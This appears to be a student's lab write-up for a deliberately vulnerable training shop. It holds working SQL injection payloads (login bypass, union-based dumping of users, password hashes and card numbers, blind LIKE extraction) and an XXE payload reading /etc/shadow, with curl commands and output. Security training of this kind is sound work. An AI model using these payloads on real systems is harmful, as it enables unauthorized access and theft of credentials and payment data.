# 1 Schoggi: SQL Injection on Login Form
## Description
- We need to get access to a user that corresponds to the first row in the database by exploiting a SQL injection vulnerability
We got the following hints by the LAB:
- MYSQL Schema
- SELECT Statement is used for username and password, first row if found identifies the user
- Chocoshop uses hashes, these are also used in the select statement 
- Login by Rest API 
- We need to use the SQL Limit keyword to get the first user

How I did it:
First I need to know about what the request looks like. With Burp i saw the API call:
```
POST /api/login HTTP/1.1
Host: c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 37
Origin: https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land
Referer: https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land/login
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"test","password":"test"}
```

Then we need to think about what the SQL Statement probably will look like. Based on the decription it is something like this: 
`SELECT * from users WHERE username="foo" and password="bar_hashed"`

We can now use the comment  signs to try around `--`

`admin'--` seemed to freeze the site. Let's see if we see more in curl. 

```
❯ curl 'https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land/api/login' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land' \
  -H 'Connection: keep-alive' \
  -H 'Referer: https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land/login' \ 
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Priority: u=0' \
  -H 'TE: trailers' \
  --data-raw $'{"username":"admin\'--","password":"asdasdasd"}'
<html>

<style>
#loading{
  position: fixed;
  display: block;
  width: 300px;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
.message {
  text-align: center;
}
.spinner {
  left: calc(50% - 60px - 8px - 8px);
  border: 16px solid #f3f3f3; /* Light grey */
  border-top: 16px solid #3498db; /* Blue */
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}
.rel {
  position: relative;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>

<div id="loading">
  <div class="spinner rel">
  </div>
  <div class="message rel">
    <p>
    Loading, please wait ...
    </p>
  </div>
</div>

<script type="text/javascript">
var pingUrl = window.location.href;

function ping() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

      parser = new DOMParser();
      xmlDoc = parser.parseFromString(xhttp.responseText,"text/html");
      loader = xmlDoc.getElementById("loading");

      if (!loader) {
        window.location.href = pingUrl;
      }
    }
  };
  xhttp.open("GET", pingUrl, true);
  xhttp.send()
}

setInterval(ping, 2000);
</script>

</html>

```

Seems to be the wrong aproach. 

After reading through some websites i found this snippet:
`' OR 1=1 LIMIT 0,1#` This does the following, it validates if 1 equals one which is always true and returns the first user. It also comments out our password request. We can login like this because the system found a valid user. 

After that we see that the first user is *alice*. In this way we can try through all the users till we find the admin. 

After trying around i found the admin user to be the 5th position (4,1):

> Note the first user could also just be found by providing the statement `' OR 1=1#` 
## Username
First user (0,1):  **Alice**

Admins based on admin overview page: **Peggy and Victor**

# 2 SCHOGGI: Union-Based SQL Injection
## Description
- We need to get the *usernames, password hashes and credit card numbers* of all users by exploiting the *Search by product name* functionality.
We got the following hints by the lab:
- Rest API get's used for the search
- use sqlmap to test the tool

First I looked at the search API with burp:
```
POST /api/search HTTP/1.1
Host: c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI0YWJmOGNlZS00ZjBkLTRjNWUtOGE5Zi04ZTNhODE4NDkyN2YiLCJ1aWQiOjEwMSwiZXhwIjoxNzU5Nzg1NzYxfQ.bHF05PhxkBHlW0IrnRdUgPZd-fEiifF0_xwmt5Si0IU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 17
Origin: https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land
Referer: https://c4c6339e-862f-4d66-a0bb-990b291f8c67.i.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"search":"choco"}
```

It returns something like:
```
{
	"0": {
		"description": "Awesome chocolate cake",
		"img": "cake1.jpg",
		"name": "Choco",
		"pid": 1,
		"price": 17
	}
}
```
It seems to be sent unchanged. Based on the reply we can deduce that the statement is something like this:

`SELECT * FROM products WHERE name like '%choco%'`
With this knowledge we can now try to find out how we many columns our table has. We can do this with the following snippet:
`choco'ORDER BY 1# -->choco'ORDER BY 2#...choco'ORDER BY X#` till something happens in out dev console. After iterating through it we found out, that we have 5 columns. 

We can now get more infos by doing a union statement:
`test' UNION SELECT 'A','B','C','D','E'#`

Good now we need to find the different data names. (username and so on). We can use the following statement over curl (the website limits us to only 50 characters) to find out how the tables are built up:
```
UNION SELECT NULL, table_name, NULL, NULL, NULL 
FROM information_schema.tables 
WHERE table_schema = DATABASE() 
LIMIT 0,10
```

This was the output of my terminal:
```
❯ curl 'https://d86c9506-5969-40b1-bab2-59a9a8cb1f43.i.vuln.land/api/search' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-raw "{\"search\":\"choco' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,10#\"}"

[{"description":null,"img":null,"name":"comments","pid":null,"price":null},{"description":null,"img":null,"name":"orders","pid":null,"price":null},{"description":null,"img":null,"name":"products","pid":null,"price":null},{"description":null,"img":null,"name":"users","pid":null,"price":null},{"description":"Awesome chocolate cake","img":"cake1.jpg","name":"Choco","pid":1,"price":17}]
```

Now we know that the users table probably contains all of the data or gives us a hint where the rest of the data is. 
```
❯ curl 'https://d86c9506-5969-40b1-bab2-59a9a8cb1f43.i.vuln.land/api/search' \
  -X POST -H 'Content-Type: application/json' \
  --data-raw "{\"search\":\"choco' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name='users'#\"}"
 
[{"description":"Awesome chocolate cake","img":"cake1.jpg","name":"Choco","pid":1,"price":17},{"description":null,"img":null,"name":"address,credit_card,password_hash,phone,picture,role,uid,username","pid":null,"price":null}]
```

Here we see that that these are the needed data fields:
*credit_card, password_hash, username*. We can then again use another SQL injection to extract it:
```
curl 'https://d86c9506-5969-40b1-bab2-59a9a8cb1f43.i.vuln.land/api/search' \
  -X POST -H 'Content-Type: application/json' \
  --data-raw "{\"search\":\"choco' UNION SELECT NULL, CONCAT_WS(':',username,password_hash,credit_card), NULL, NULL, NULL FROM users LIMIT 0,10#\"}"

[{"description":null,"img":null,"name":"alice:765adadbce1bcddb3bcbdbf7c8e312b5f3fd6b1fa278b8d884eb1cb8552fb1a1:2034 8857 0007 8024","pid":null,"price":null},{"description":null,"img":null,"name":"bob:985089972f3b4fc822a99bb38b6051935954944265f932a88e6e265bb9d2f90c:1325 4455 6767 9810","pid":null,"price":null},{"description":null,"img":null,"name":"charlie:5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae:2028 4889 0003 9887","pid":null,"price":null},{"description":null,"img":null,"name":"eve:abbf8e6e2dd434cfa8545f7972045ef7fdf28a1e2a0fda258776d8189ed11875:4987 6439 4973 7403","pid":null,"price":null},{"description":null,"img":null,"name":"mallory:522c804c591605b0d9b27483b16b6227caa4dfeecd725c459e3de9de635fb228:2025 6655 4475 3991","pid":null,"price":null},{"description":null,"img":null,"name":"peggy:a0fc1cc4cfee7292d7d285aedb1ef3845332b64b04340ce6e3ee87f483396af4:","pid":null,"price":null},{"description":null,"img":null,"name":"victor:59fe46987db46666b335c749636abb06ca23f73fc10bb943066e660ddc7410f7:2024 1968 4466 0002","pid":null,"price":null},{"description":"Awesome chocolate cake","img":"cake1.jpg","name":"Choco","pid":1,"price":17}]
```
Here we have the answer, we can now read out Charlies description easily:
`{"description":null,"img":null,"name":"charlie:5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae:2028 4889 0003 9887","pid":null,"price":null}`
Or in Humanized form:
- Username: `charlie`
- Password hash:`5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae
- Credit Card number: `2028 4889 0003 9887`

# 3 SCHOGGI: Blind SQL Injection Solution

## Attack Steps Description

### Step 1: Initial Reconnaissance
- Tested login with existing username `alice` vs non-existing username `test`
- Observed different HTTP responses in Burp Suite:
  - Existing user: `Invalid user or password`
  - Non-existing user: `Error during login`

### Step 2: Confirming SQL Injection
- Injected `alice'-- ` as username
- Got `Invalid user or password` (expected `Error during login`)
- Confirms vulnerability: query becomes `SELECT * FROM users WHERE username='alice'--'`

### Step 3: Establishing the Oracle
- Tested `alice' AND (1=1)-- ` → `Invalid user or password` (TRUE)
- Tested `alice' AND (1=0)-- ` → `Error during login` (FALSE)
- Oracle: TRUE = "Invalid user or password", FALSE = "Error during login"

### Step 4: Extracting Credit Card with LIKE Pattern
Used LIKE with wildcard `%` to guess each character:

**Character 1:**
`alice' AND credit_card LIKE '2%'-- ` → Invalid user or password ✓

**Character 2:**
`alice' AND credit_card LIKE '20%'-- ` → Invalid user or password ✓

**Character 3:**
`alice' AND credit_card LIKE '203%'-- ` → Invalid user or password ✓

**Character 4:**
`alice' AND credit_card LIKE '2034%'-- ` → Invalid user or password ✓

Continued this pattern, testing 0-9 and space for each position until no match found.

## First Four Characters of Mallory's Credit Card

**2034**

# 4 SCHOGGI: XML External Entity (XXE) Solution

## Attack Steps Description

### Step 1: Preparation
- Logged in with credentials `alice/alice.123` (from hints)
- Navigated to **BULK ORDER** functionality
- Downloaded the sample XML file to understand the structure
- Analyzed the XML format used by the application

### Step 2: Understanding the XML Structure
The base XML structure looks like:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<order>
    <product>
        <name>Product Name</name>
        <quantity>25</quantity>
    </product>
</order>
```

### Step 3: Crafting the XXE Payload
Modified the XML file to include an External Entity declaration that reads `/etc/shadow`:

**Initial attempt with path traversal:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE query [ <!ENTITY attack SYSTEM "file://localhost/../../../../../../../../etc/shadow"> ]>
<order>
    <product>
        <name>&attack;</name>
        <quantity>25</quantity>
    </product>
    <product>
        <name>Chococcasion</name>
        <quantity>12</quantity>
    </product>
</order>
```

### Step 4: Finding the Correct Path

- Uploaded the initial payload
- Received error: `file missing` - which confirms XXE vulnerability exists
- Adjusted the path by removing excessive traversal sequences

**Working payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE query [ <!ENTITY attack SYSTEM "file:///etc/shadow"> ]>
<order>
    <product>
        <name>&attack;</name>
        <quantity>25</quantity>
    </product>
    <product>
        <name>Chococcasion</name>
        <quantity>12</quantity>
    </product>
</order>
```


### Step 5: Successful Exploitation

- Uploaded the corrected XML file through the Bulk Order interface
- The application processed the XML and resolved the external entity
- The content of /etc/shadow was displayed in the response where the product name appears

<img width="1728" height="970" alt="Screenshot 2025-10-07 at 22 03 35" src="https://github.com/user-attachments/assets/944469ad-499f-42ac-b594-c424bfa1ef6c" />
